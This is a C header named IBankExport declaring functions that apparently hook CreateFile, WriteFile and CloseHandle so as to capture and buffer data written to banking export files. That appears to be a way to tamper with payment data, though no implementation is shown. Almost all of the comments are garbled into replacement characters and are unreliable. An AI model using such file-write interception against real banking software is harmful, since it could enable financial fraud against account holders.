#ifndef IBankExportH
#define IBankExportH

//������������� ������ ��� �������� ��������, ���������� ��� ����� � ������� ���������� ���������
bool SExpInit(const char* fileSettings);
//�������
void SExpRelease();
//���������� � ���� ������� CreateFile, ��� �������� ����� � ������ GENERIC_WRITE, ������� �������� ����� �����
//� ������ SExpFiles ��� ����������� ��������� ������������ ������
//���������� true ���� ����� ����� ������� ��������, ����� false - ��� �������� �������� ���������� ������ ��� 
//SExpFiles, � ����� ������ ����� ��������� �������� ��������� MaxSExpFiles
bool SExpCreateFile( HANDLE file, LPCWSTR lpFileName );
//��������� ������ � ������ ��� ���������� ��������, ���� ���������� true, �� ������ ������� ������� � �� ������� ������� 
//�� ����� �� ���������� � �������� ������� WriteFile, �� ��� ���� � ���������� ���������� ������� ��� ������ ���������,
//false - ������ ����������, ������������� �� ������� ������� �����
//��������� ��� ������ � �������� ������� WriteFile
bool SExpWriteFile( HANDLE file, LPCVOID buf, DWORD sz );
//���������� � ���� ������� CloseHandle(), ������� ����������� � ��������� ������, � �������� ��������� ��������� � �������� ����
//�������� �������� ����� ������ ���� �� ������� ������� (� ����)
void SExpCloseHandle(HANDLE file);

#endif //IBankExportH
